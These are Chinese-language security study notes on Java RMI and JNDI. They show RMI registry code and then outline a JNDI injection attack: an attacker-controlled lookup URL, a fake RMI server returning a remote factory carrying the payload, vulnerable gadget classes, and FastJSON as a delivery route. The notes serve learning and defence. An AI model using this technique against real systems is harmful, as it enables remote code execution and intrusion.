# RMI

基于序列化的java远程调用，反序列化入口。  
依赖JRMP协议，参数对象通过序列化后传输。  
客户端的类serialVersionUID必须与服务器一致。

远程服务器实现方法并提供接口，客户端根据接口类定义，传参调用。  
远程调用方法类实现java.rmi.Remote接口。继承UnicastRemoteObject类或在构造方法中调用UnicastRemoteObject.exportObject方法。  
客户端必须有远程调用类的接口。

JVM之间通信时，服务端把远程对象的代理stub（包含地址端口等信息）传递给客户端。  
server监听端口，client调用stub提供的方法，server执行方法，stub返回结果给client。

RMI注册表是远程对象，监听在1099端口  
```java
IHello rhello = new HelloImpl();
LocateRegistry.createRegistry(1099);  //服务器创建注册表
Naming.bind("rmi://0.0.0.0:1099/hello", rhello);  //将对象引用和URL绑定
```

client通过注册表查询调用
```java
Registry registry = LocateRegistry.getRegistry("192.168.1.110",1099);
IHello rhello = (IHello) registry.lookup("hello");  //在注册表中查找
rhello.sayHello("test");  //远程调用
```

client JVM中如果不存在class，则通过http请求下载类class，动态加载。

# JNDI

查找和访问资源通用接口，可用来调用远程对象。  
支持多种naming and directory providers，如rmi registry service provider

控制lookup参数注入攻击
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory
env.put(Context.PROVIDER_URL, "rmi://172.16.240.135:8080");
Context ctx = new InitialContext(env);
Object local_obj = ctx.lookup("rmi://172.16.240.135:8080/test");  //该URL为攻击者可控
```

1. 目标代码调用InitialContext.lookup(URL)，URL可控
2. 伪造RMI服务地址：rmi://server/name
3. 服务器返回Reference对象指定factory
4. 目标动态加载并实例化factory，factory.getObjectInstance
5. 在Factory的构造方法，静态代码，getObjectInstance中写POC

## 存在问题的地方：

- spring-tx.jar JtaTransactionManager.readObject
- com.sun.rowset.JdbcRowSetImpl.execute

当使用json格式传输参数时，利用FastJon控制set方法，将伪造的RMI服务地址传入lookup方法。

参考：https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw
